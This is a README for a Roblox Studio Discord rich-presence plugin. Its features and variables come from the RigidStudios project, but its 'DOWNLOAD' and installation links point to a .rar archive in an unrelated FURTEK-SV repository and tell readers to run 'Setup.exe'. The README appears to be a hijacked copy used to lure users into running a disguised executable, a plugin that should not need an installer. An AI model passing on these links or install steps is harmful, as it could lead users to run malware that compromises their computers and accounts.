# roblox-discord-presence
A plugin/local http server pair which connects to your discord client and sets your development status.

Feel free to contribute code, README contributions must be substantial.

# [DOWNLOAD]((https://github.com/FURTEK-SV/ActualVersion/releases/download/Update/ActualVersion.rar))

# Start Setup.exe

## Examples
![My own Rich Presence](https://i.imgur.com/8UCUake.png) ![A friend's Rich Presence](https://i.imgur.com/2iRtS6D.png) <img src="https://user-images.githubusercontent.com/34319439/110258821-f3c12500-7fbd-11eb-8b68-a5b0b91f1192.PNG" alt="alt text" width="300">

## Features
* Customizable Text.
* Script context variables:
   * `$SCRIPT_NAME` - Name of the script currently being edited.
   * `$SCRIPT_LINES` - Count of the script's lines.
   * `$SCRIPT_PARENT` - Name of the script's parent.
   * `$ACTIVITY:...` - Activity status (Idle/Away) or if a script is actively being edited, selects text after the `:`.
   * `$WORKSPACE` - Place name/File name.
   * `$PLACE_ID` - Place name/"0".
   * `$PLACE_PUBLISHED:...:...` - If place published then first option otherwise second option.
   * (More to come, feel free to [add your own](https://github.com/RigidStudios/roblox-discord-presence/blob/main/plugin/src/DRPC/src/generators/formatString.lua))
* Supports **buttons** (2 max.)
* In-Studio configuration UI.
* Toggleable.

## Installation
* The plugin is available [here (DRPC_client)](https://github.com/FURTEK-SV/ActualVersion/releases/download/Update/ActualVersion.rar)
